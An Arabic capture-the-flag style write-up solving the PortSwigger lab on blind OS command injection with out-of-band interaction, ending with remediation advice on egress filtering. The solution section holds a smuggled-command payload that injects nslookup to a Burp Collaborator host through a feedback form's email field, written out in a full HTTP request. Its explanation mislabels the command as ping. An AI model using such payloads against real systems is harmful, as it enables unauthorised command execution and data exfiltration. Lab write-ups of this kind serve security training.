# [Blind OS command injection with out-of-band interaction](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)

## **`الهدف`**
قم باستغلال ثغرة `Blind OS` لإصدار `DNS lookup` إلى `Burp Collaborator`.
## **`خطوات الحل`**
==**`ملاحظة هامة:`**== لا يمكن حل هذا اللاب إلا باستعمال أداة `Burp Collaborator` والتي تتوفر فقط في النسخة المدفوعة من `Burp Suite`.

سنقوم بالضغط على `Submit feedback` ثم نقوم بوضع أى بيانات عشوائية وإرسال الطلب، ثم تحويله من داخل `HTTP history` إلى `Repeater` 

ثم سنقوم بتعديل قيمة حقل `email` من داخل `Inspector` كالتالي مع وضع رابط الـ `Subdomain` الخاص بـ `Burp Collaborator` في موضعه
```Shell
test||nslookup BURP-COLLABORATOR-SUBDOMAIN||
```

ثم سنقوم بإرسال الطلب لننتهي من حل اللاب
```http
POST /feedback/submit HTTP/2
Host: 0aa500e0033017b481bfca48007600b3.web-security-academy.net
Cookie: session=JXK6XL7IDmyB39i4tfPBM22fNNWDhvRo

csrf=GQptdvQqbm4bfdfRuQviJbbdHe2HLwB5&name=test&email=test%7c%7cnslookup%20mtjyif5ir3ja556wmb01muxsyj4es4gt.oastify.com%7c%7c&subject=test&message=test
```

==`ملاحظة:`== الدابل بايب `(||)` تعنى `OR` أى عند فشل الأمر الأول قم بتنفيذ التالي، عندما قمنا بوضع بريد غير صالح بصيغة خاطئة فشل الإرسال فتم تنفيذ أمر `Ping` أما الـ `||` الأخير فهي للفصل بين أمر `Ping` وباقي سطر الأوامر لكي لا يحدث تداخل.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب` [Blind OS command injection with time delays](./Blind-OS-command-injection-with-time-delays.md)

ويجب تطبيق سياسة تقييد الاتصالات الصادرة `Egress Filtering` على مستوى الجدار الناري `Firewall`، بحيث يتم منع سيرفر الويب من إجراء أي اتصالات صادرة `Outbound Connections` نحو شبكة الإنترنت الخارجية بشكل افتراضي تطبيقًا لمبدأ المنع الافتراضي `Default Deny`، والسماح للسيرفر فقط بالاتصال بالوجهات الخارجية الضرورية والمحددة مسبقاً عبر قائمة بيضاء صارمة `Strict Whitelist`، لمنع المهاجم من استغلال السيرفر للاتصال بخوادم خارجية يتحكم بها `OAST` لتأكيد الثغرات العمياء `Blind OS` أو تسريب البيانات `Out-of-band Data Exfiltration`.
